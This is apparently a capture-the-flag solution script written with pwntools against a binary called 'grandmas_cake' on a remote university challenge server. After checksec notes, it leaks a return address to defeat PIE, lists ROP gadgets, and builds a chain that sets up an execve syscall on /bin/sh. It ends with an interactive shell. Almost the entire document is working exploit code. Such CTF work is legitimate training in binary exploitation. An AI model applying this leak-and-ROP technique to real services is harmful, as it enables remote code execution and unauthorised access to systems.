'''CHECKSEC
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''

from pwn import *

DEBUG = 0
if DEBUG == 1:
    context.log_level = "debug"

context.binary = exe = ELF("./grandmas_cake")

#p = process("./grandmas_cake")
p = remote("cyberchallenge.diag.uniroma1.it", "5202")

print(p.recvuntil(b">"))
payload = b"strawberry" + b"P"*6 + b"B"*8
p.send(payload)

leak = p.recvuntil(b'>')
print(leak)
leak = u64(leak[57:63].ljust(8, b"\x00"))
pie_base = leak - 0x1372    #0x1372 is actually the real return addres without pie

rop = ROP(exe)
'''
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget.insns)
    0x1017 ['add esp, 8', 'ret']
    0x1016 ['add rsp, 8', 'ret']
    0x1322 ['leave', 'ret']
    0x11f9 ['pop r13', 'pop rsi', 'ret']
    0x11f1 ['pop rax', 'pop rdx', 'ret'] NEED THIS ONE
    0x11f4 ['pop rax', 'ret']
    0x11fa ['pop rbp', 'pop rsi', 'ret']
    0x11d3 ['pop rbp', 'ret']
    0x11f6 ['pop rcx', 'ret']
    0x11f8 ['pop rdi', 'pop r13', 'pop rsi', 'ret'] NEED THIS ONE
    0x11f2 ['pop rdx', 'ret'] 
    0x11fb ['pop rsi', 'ret'] 
    0x101a ['ret']
    0x11fd ['syscall']
'''
main_gadget = 0x11f1 + pie_base
second_gadget = 0x11f8  + pie_base
syscall_gadget = 0x11fd  + pie_base

payload = b'A'*16
payload += b'B'*8
payload += p64(main_gadget)
payload += p64(59)
payload += p64(0)
payload += p64(second_gadget)
payload += p64(0x4010 + 13 +pie_base) 
#exe.address = pie_base         #this is a better way
#binsh = next(exe.search(b"/bin/sh\x00"))
payload += p64(0)
payload += p64(0)
payload += p64(syscall_gadget)

p.sendline(payload)
p.interactive()

#57

